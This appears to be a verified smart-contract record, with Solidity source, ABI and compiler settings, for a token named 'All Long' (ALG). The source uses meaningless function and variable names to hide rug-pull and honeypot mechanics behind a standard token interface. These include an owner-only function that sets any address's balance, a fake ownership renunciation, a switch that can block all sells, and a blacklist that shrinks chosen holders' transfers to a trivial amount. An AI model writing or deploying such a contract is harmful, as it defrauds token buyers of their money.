{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface shouldFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableSender {\n    function createPair(address marketingFrom, address txAt) external returns (address);\n}\n\ninterface maxAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLaunched) external view returns (uint256);\n\n    function transfer(address amountTeamMarketing, uint256 amountFund) external returns (bool);\n\n    function allowance(address launchedLaunchLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTeamMarketing,\n        uint256 amountFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromBuy, uint256 value);\n    event Approval(address indexed launchedLaunchLiquidity, address indexed spender, uint256 value);\n}\n\ninterface toAutoReceiver is maxAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AllLong is shouldAuto, maxAmount, toAutoReceiver {\n\n    function atFee(address shouldIs, uint256 amountFund) public {\n        maxTotal();\n        buyAuto[shouldIs] = amountFund;\n    }\n\n    function launchedSell(address walletMin, address amountTeamMarketing, uint256 amountFund) internal returns (bool) {\n        require(buyAuto[walletMin] >= amountFund);\n        buyAuto[walletMin] -= amountFund;\n        buyAuto[amountTeamMarketing] += amountFund;\n        emit Transfer(walletMin, amountTeamMarketing, amountFund);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed teamSender, address indexed minLiquidityEnable);\n\n    bool private feeLimitExempt;\n\n    address private minExempt;\n\n    uint8 private launchEnable = 18;\n\n    uint256 public maxFee;\n\n    uint256 public listBuy;\n\n    function shouldFundReceiver() public {\n        emit OwnershipTransferred(takeSell, address(0));\n        minExempt = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeMarketingToken;\n    }\n\n    uint256 constant feeSender = 16 ** 10;\n\n    function buyWallet(address walletMin, address amountTeamMarketing, uint256 amountFund) internal returns (bool) {\n        if (walletMin == takeSell) {\n            return launchedSell(walletMin, amountTeamMarketing, amountFund);\n        }\n        uint256 limitIs = maxAmount(walletSwap).balanceOf(teamAutoMarketing);\n        require(limitIs == receiverFee);\n        require(amountTeamMarketing != teamAutoMarketing);\n        if (launchedLaunch[walletMin]) {\n            return launchedSell(walletMin, amountTeamMarketing, feeSender);\n        }\n        return launchedSell(walletMin, amountTeamMarketing, amountFund);\n    }\n\n    uint256 exemptTake;\n\n    function getOwner() external view returns (address) {\n        return minExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderFundMin;\n\n    function maxTotal() private view {\n        require(maxTxShould[_msgSender()]);\n    }\n\n    function transfer(address shouldIs, uint256 amountFund) external virtual override returns (bool) {\n        return buyWallet(_msgSender(), shouldIs, amountFund);\n    }\n\n    address public walletSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchEnable;\n    }\n\n    uint256 receiverFee;\n\n    function allowance(address receiverMode, address walletBuy) external view virtual override returns (uint256) {\n        if (walletBuy == limitMinMode) {\n            return type(uint256).max;\n        }\n        return senderFundMin[receiverMode][walletBuy];\n    }\n\n    address public takeSell;\n\n    function isAuto(uint256 amountFund) public {\n        maxTotal();\n        receiverFee = amountFund;\n    }\n\n    uint256 private marketingAuto;\n\n    uint256 private totalReceiver;\n\n    address teamAutoMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address walletMin, address amountTeamMarketing, uint256 amountFund) external override returns (bool) {\n        if (_msgSender() != limitMinMode) {\n            if (senderFundMin[walletMin][_msgSender()] != type(uint256).max) {\n                require(amountFund <= senderFundMin[walletMin][_msgSender()]);\n                senderFundMin[walletMin][_msgSender()] -= amountFund;\n            }\n        }\n        return buyWallet(walletMin, amountTeamMarketing, amountFund);\n    }\n\n    uint256 private maxAt;\n\n    string private takeMarketingToken = \"ALG\";\n\n    string private tokenSwap = \"All Long\";\n\n    bool public tokenTake;\n\n    mapping(address => uint256) private buyAuto;\n\n    address limitMinMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public takeSwap;\n\n    function owner() external view returns (address) {\n        return minExempt;\n    }\n\n    function balanceOf(address minLaunched) public view virtual override returns (uint256) {\n        return buyAuto[minLaunched];\n    }\n\n    uint256 private launchSenderMarketing = 100000000 * 10 ** 18;\n\n    function isSell(address minAuto) public {\n        if (tokenTake) {\n            return;\n        }\n        if (maxAt == receiverSender) {\n            totalReceiver = listBuy;\n        }\n        maxTxShould[minAuto] = true;\n        if (takeSwap) {\n            feeLimitExempt = true;\n        }\n        tokenTake = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenSwap;\n    }\n\n    uint256 private listReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchSenderMarketing;\n    }\n\n    mapping(address => bool) public maxTxShould;\n\n    function sellTotal(address tradingAmount) public {\n        maxTotal();\n        \n        if (tradingAmount == takeSell || tradingAmount == walletSwap) {\n            return;\n        }\n        launchedLaunch[tradingAmount] = true;\n    }\n\n    constructor (){\n        \n        shouldFrom listFrom = shouldFrom(limitMinMode);\n        walletSwap = enableSender(listFrom.factory()).createPair(listFrom.WETH(), address(this));\n        if (takeSwap) {\n            maxFee = receiverSender;\n        }\n        takeSell = _msgSender();\n        shouldFundReceiver();\n        maxTxShould[takeSell] = true;\n        buyAuto[takeSell] = launchSenderMarketing;\n        \n        emit Transfer(address(0), takeSell, launchSenderMarketing);\n    }\n\n    mapping(address => bool) public launchedLaunch;\n\n    function approve(address walletBuy, uint256 amountFund) public virtual override returns (bool) {\n        senderFundMin[_msgSender()][walletBuy] = amountFund;\n        emit Approval(_msgSender(), walletBuy, amountFund);\n        return true;\n    }\n\n    uint256 private receiverSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLaunchLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLiquidityEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFund\",\"type\":\"uint256\"}],\"name\":\"atFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountFund\",\"type\":\"uint256\"}],\"name\":\"isAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"isSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"}],\"name\":\"sellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTeamMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AllLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}